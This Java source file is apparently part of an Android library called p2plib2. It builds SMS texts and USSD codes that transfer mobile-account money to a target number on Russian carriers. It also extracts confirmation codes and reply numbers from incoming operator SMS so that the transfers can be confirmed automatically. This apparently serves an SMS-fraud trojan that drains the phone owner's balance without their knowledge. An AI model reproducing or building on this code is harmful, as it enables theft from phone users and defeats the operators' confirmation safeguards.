package com.p2plib2.common;

import com.p2plib2.Logger;

import static com.p2plib2.common.CommonFunctions.equalsOperators;
import static com.p2plib2.sms.SmsMonitor.checkContents;

public class Constructors {
    /**
     * @return msg for sms payment request for specifying operator
     */
    public static String createMsgBody(String operatorName, String sum, String target) {
        String msgBody = "";
        if (equalsOperators(operatorName, MapData.OperatorNames.MTS)) {
            msgBody = "#перевод " + sum;
        } else if (equalsOperators(operatorName, MapData.OperatorNames.BEELINE)) {
            msgBody = "7" + target + " " + sum;
        } else if (equalsOperators(operatorName, MapData.OperatorNames.MEGAFON)) {
            msgBody = sum + " перевод";
        }
        return msgBody;
    }

    /**
     * @return - format telephone number for sms sending
     */
    public static String getOperatorNumber(String operatorName, String smsNum, String target) {
        Logger.lg("operatorName " + operatorName + " " + smsNum + " " + target);
        String operNum = "";
        if (equalsOperators(operatorName, MapData.OperatorNames.BEELINE)) {
            operNum = smsNum;
        } else if (equalsOperators(operatorName, MapData.OperatorNames.MEGAFON)
                || equalsOperators(operatorName, MapData.OperatorNames.MTS)) {
            operNum = "+7" + target;
        }
        return operNum;
    }

    /**
     * @return - answer smsm for specifying operator
     * TODO HashMap for templates
     */
    public static String getAnswerMsgBody(String operatorName, String sms_body) {
        String answer = "";
        if (sms_body.toLowerCase().contains("подтвер")) {
            if (sms_body.contains("кодом ") && sms_body.contains(" в ответном")) {
                answer = sms_body.substring(sms_body.indexOf("кодом ") + 6, sms_body.indexOf(" в ответном") + 1);
            } else {
                answer = "1";
            }
        } else {
            answer = "1";
        }
        return answer;
    }

    /**
     * @return - answer smsm for specifying operator
     * TODO HashMap for templates
     */
    public static String getNumberForAnswer(String operatorName, String sms_body, String sender) {
        String answerNumber = "";
        if (sms_body.contains("ответ") && sms_body.contains("на номер")) {
            answerNumber = sms_body.substring(sms_body.indexOf("на номер") + 8).replaceAll("[^0-9]", "");
        } else if (checkContents(sms_body, MapData.answerSenderCatch.get(MapData.OperatorNames.ALL))) {
            answerNumber = sender;
        }
        return answerNumber;
    }

    /**
     * @return - ussd string command for call
     * TODO HashMap for templates
     */
    public static String getUssdCommand(String operatorName, String sum, String target, String ussdNum) {
        String ussdCommand = "";
        if (equalsOperators(operatorName, MapData.OperatorNames.BEELINE)) {
            ussdCommand = ussdNum + target + "*" + sum + "#";
        } else if (equalsOperators(operatorName, MapData.OperatorNames.MEGAFON)) {
            ussdCommand = ussdNum + sum + "*" + target + "#";
        } else if (equalsOperators(operatorName, MapData.OperatorNames.TELE)) {
            ussdCommand = ussdNum + target + "*" + sum + "#";
        }
        return ussdCommand;
    }
}
